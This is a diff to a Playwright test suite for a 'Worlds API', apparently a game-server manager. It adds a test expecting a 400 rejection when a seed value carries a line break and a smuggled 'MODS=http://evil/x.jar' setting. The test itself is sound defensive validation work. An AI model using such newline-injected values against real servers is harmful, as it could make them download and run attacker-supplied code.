@@ -92,6 +92,14 @@ test.describe('Worlds API', () => {
       expect(response.status()).toBe(400);
     });
 
+    test('should reject a seed with a line break (#726)', async ({ request }) => {
+      const response = await request.post(`${API_BASE_URL}/api/worlds`, {
+        data: { name: `${testWorldName}-seed`, seed: '1\nMODS=http://evil/x.jar' },
+      });
+
+      expect(response.status()).toBe(400);
+    });
+
     test('should create a new world', async ({ request }) => {
       const response = await request.post(`${API_BASE_URL}/api/worlds`, {
         data: {
